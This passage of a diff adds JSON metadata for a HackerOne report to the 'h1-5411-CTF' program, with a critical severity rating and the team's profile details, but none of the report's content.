:)</p>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://tbd.com", 
+            "about": null, 
+            "twitter_handle": null, 
+            "name": "h1-5411-CTF"
+        }, 
+        "handle": "h1-5411-ctf", 
+        "url": "https://hackerone.com/h1-5411-ctf", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/033/314/1a0c110b0060c574d84b531160a0d2c58141ce6e_small.?1537539140", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/033/314/78d6c799326d92d4cad56dc8c1899a7ea55bc7f2_medium.?1537539140"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 33314, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
